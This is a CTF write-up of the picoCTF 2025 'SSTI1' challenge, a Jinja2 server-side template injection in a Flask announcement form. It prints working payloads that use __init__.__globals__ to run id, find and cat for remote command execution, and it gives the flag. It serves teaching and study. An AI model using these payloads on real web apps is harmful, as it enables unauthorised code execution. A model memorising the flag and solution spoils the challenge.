# SSTI1

**Platform:** CyLab Security Academy (picoCTF), picoCTF 2025
**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}`

## Summary

A Flask app lets a user submit an "announcement" that gets rendered straight back to them. The
submitted text is passed directly into the Jinja2 template engine instead of being treated as
plain data, giving full server side template injection and, from there, arbitrary command
execution as the app's own user.

## Discovery

The homepage has a single form posting a `content` field to `/`, which 302 redirects to
`/announce`. `/announce` itself only accepts `POST` (confirmed via `OPTIONS`, `Allow: POST,
OPTIONS`) and echoes back whatever was submitted, styled as a large heading. Submitting a basic
math expression as the content confirms template evaluation rather than literal text output:

```
POST /announce
content={{7*7}}
```

returns `49` in the response body instead of the literal string `{{7*7}}`, confirming Jinja2 SSTI.

## Proof of Concept

Escalate from expression evaluation to command execution using the standard Jinja2 SSTI sandbox
escape through `self.__init__.__globals__`:

```
curl -s -X POST http://TARGET/announce \
  --data-urlencode "content={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
```

This confirmed RCE, then a filesystem search located the flag:

```
content={{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -iname "*flag*" 2>/dev/null').read() }}
```

which surfaced `/challenge/flag`, read directly with:

```
content={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}
```

## Root Cause

User-controlled input is concatenated or passed directly into a Jinja2 `render_template_string`
(or equivalent) call instead of being passed as a template variable to a static template. Jinja2
templates can reach back into Python's object graph from any object's `__init__.__globals__`
attribute, so any code path that lets user input reach the template compiler is equivalent to
full RCE unless the environment is sandboxed.

## CWE / OWASP

- **CWE-1336**: Improper Neutralization of Special Elements Used in a Template Engine
- **CWE-94**: Improper Control of Generation of Code (Code Injection)
- **OWASP A03:2021**: Injection
